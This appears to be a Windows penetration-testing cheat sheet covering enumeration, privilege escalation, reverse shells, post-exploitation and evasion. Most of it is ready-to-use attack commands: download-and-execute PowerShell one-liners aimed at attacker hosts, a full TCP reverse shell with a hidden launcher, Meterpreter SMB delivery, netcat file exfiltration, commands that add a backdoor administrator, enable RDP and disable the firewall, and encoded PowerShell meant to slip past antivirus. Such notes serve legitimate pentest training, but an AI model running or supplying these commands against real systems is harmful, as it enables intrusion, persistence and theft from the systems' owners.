# Basics

* Always work from %TEMP% directory as it allows all users to write and it might be less monitored than system folders

```powershell
PS> cd $env:temp
```

```cmd
cmd> cd %TEMP%
```


## Windows Native programs
Those programs can be found on every post Win10 machines:

* System configuration: `MSConfig`
* Control Panel: `control.exe`
* Windows Troubleshooting:  `C:\Windows\System32\control.exe /name Microsoft.Troubleshooting`
* User Account Control Settings: `UserAccountControlSettings.exe`
* Computer Management (Task Scheduler, Event Viewer ...): `compmgmt.msc`
* System Information: `msinfo32.exe`
* Ressource Monitor: `resmon.exe`
* Registry editor: `regedt32.exe`

## Basic cmd Commands
Read about them using help: [command_name] /?

* Access Command prompt: cmd.exe
* whoami /all
* netstat: all -a, route -r
* hostname 
* ipconfig /all
* net



## Network Enumeration


### NetBIOS

NetBIOS Name is a 16-byte name for a networking service or function on a machine running Microsoft Windows Server. NetBIOS names are a more friendly way of identifying computers on a network than network numbers.

* local: `nbtstat -n`

* remote scan: `sudo nmap -sU --script nbstat.nse -p137 <host>`

### Support tools
Powerview is extremely useful to simplify your work with powershell:
* get it: `wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1`
* read the docs: https://powersploit.readthedocs.io/en/latest/Recon/

### Basic usage
* start PS from cmd bypassing the execution policy: `powershell -ep bypass`
* importing modules is possbile with dot notation: `. .\PowerView.ps1`



## UAC

* check for UAC in PS: `(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA`
* check UAC in cmd: `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`
* UAC can be bypassed using binary exploits

# Antivirus

## Detect AV Version

* works with PS 3.0 and higher
`Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct`

## Download and Upload stuff


```powershell

# enable SMBv1
# this is going to be helpful to start file transfers
# on compromised machine

Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All

```


1. `certutil -urlcache -split -f http://source.ip/payload.exe payload.exe`
2. Download the file in PS: 
`Invoke-WebRequest -Uri "url" -OutFile "dest"`
`curl http://xxx/file.xxx -o file.xxx`
3. Download and execute in PS: 
`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL')"`

or just `IEX(New-Object Net.WebClient).DownloadString('URL')`



```
New-SmbMapping -RemotePath '\\server' -Username "domain\username" -Password "password"

#copy

copy share_path target_dir

#example 

copy c:\test '\\192.168.219.100\share_name'

```
* use in cmd
```
net use \\server /user:domain\username password
```


* Powershell
```
#run receiver on listener

nc -lvnp 443 > output.xxx

#send file
Get-Content file.xxx | .\nc.exe IP PORT

#bypass execution policy  if got admin
Set-ExecutionPolicy Unrestricted
```



## Find Stuff

* cmd: `dir /s /b c:\filename` find filename in c: drive recursively
* ps: `Get-Childitem –Path C:\ -Include *filetolookfor* -Exclude *.JPG,*.MP3,*.TMP -File -Recurse -ErrorAction SilentlyContinue`

## Recycle Bin // TBD

* access recycle bin items

```
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```

# Enumeration

## local enumeration

* Winpeas

Optional: activate this command to see colours in a new command prompt

```cmd

REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

```

Start `winpeas.exe` on victim in Temp folder



* Older systems

```
# For older Systems use Sherlock
powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).DownloadString('http://xxx.xxx.xxx.xxx/Sherlock.ps1');Find-AllVulns"

powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"

#for newer Systems use winpeas
```
## remote enumeration

* enum4linux

## If you have your ps1 file downloaded to the victim machine then run using this
```
c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"

c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
```

## RPC

* Dump services

`impacket-rpcdump TARGET_IP`

* Map RPC service
`impacket-rpcmap -no-pass -target-ip TARGET_IP ncacn_np:\\JEFF[\PIPE\atsvc]`

# Reverse Shells

## Powershell
* This is the most basic reverse shell not detectable by Windows Defender
* Replace xxx as needed:
* raw.ps1

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.219.xxx',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
```

* launch on target
```
powershell.exe -NoP -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.219.xxx/raw.ps1')"
```


## Meterpreter
This shell works even on Windows 11 but needs MSF

1. SMB delivery: `use windows/smb/smb/delivery`
2. Payload: `set payload windows/meterpreter/reverse_tcp`
3. Configure all options in MSF and `exploit`
4. During exploit execution MSF will ask you to run following on target machine: `rundll32.exe \\attacker_ip\PJSK\test.dll,0`
5. Select active session
6. Get shell: `shell`


# Escalation

## Kernel exploits

see https://github.com/jonnyzar/windows-kernel-exploits



## Standard Approach
* Download Winpeas: see github
* Follow HackTricks: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
* If it does not help, go for advances techniques



## Exposed GPP Password

* Article to read: https://grimhacker.com/2015/04/10/gp3finder-group-policy-preference-password-finder/
* Use gp3finder tool once .xml file with cpassword is founf
`docker run grimhacker/gp3finder -D edBSHOw...`

## Compiling Exploits for Windows on Kali

1. install mingw `apt install mingw-w64`
2. Compile for 64 bit

```
x86_64-w64-mingw32-gcc shell.c -o shell.exe
```
3. Compile for 32 bit
```
i686-w64-mingw32-gcc shell.c -o shell.exe
```

# Post exploitation

* Once Admin privileges obtained get SYSTEM shell
`psexec -accepteula -sid cmd.exe`

* look for stuff
`Get-Childitem –Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`

* enable RDP
`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`

* add user
`net user Pentester Password1 /ADD`

* give admin rights
`net localgroup Administrators Pentester /ADD`

* add to RDP group

`powershell -nop -c "Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Pentester""`

# Firewall

* Shut off firewall
`netsh advfirewall set allprofiles state off`

* Get all FW rules

`Get-NetFirewallRule`

Or more refinded

```
Direction Outbound - limit to outbound rules since that’s where I’m having issues
Action Block - limit to rules that block traffic
Enabled True - don’t show the large set of rules that are present but not enabled
```

* Get firewall rules for blocking outbound

```
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block |
Format-Table -Property 
DisplayName, 
@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},
@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},
@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},
Enabled,
Profile,
Direction,
Action"
```

* Get Allow exceptions

```
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow

```
# Security Bypass and Obduscation

## Encoded Powershell Execution

```
# Generator
$command = 'Write-Output "Try Harder"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$base64 = [Convert]::ToBase64String($bytes)

# Launcher
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAFQAcgB5ACAASABhAHIAZABlAHIAIgAgAA=='
```
credits to https://www.offensive-security.com/offsec/powershell-obfuscation/

## Encode and Decode binary file to transfer it to victim

```
# encode from binary file to base64txt

powershell -C "& {$outpath = (Join-Path (pwd) 'out_base64.txt'); $inpath = (Join-Path (pwd) 'data.jpg'); [IO.File]::WriteAllText($outpath, ([convert]::ToBase64String(([IO.File]::ReadAllBytes($inpath)))))}"

# decode from base64txt to binary file

powershell -C "& {$outpath = (Join-Path (pwd) 'outdata2.jpg'); $inpath = (Join-Path (pwd) 'out_base64.txt'); [IO.File]::WriteAllBytes($outpath, ([convert]::FromBase64String(([IO.File]::ReadAllText($inpath)))))}"

```

big thanks for the skript to https://gist.github.com/t2psyto
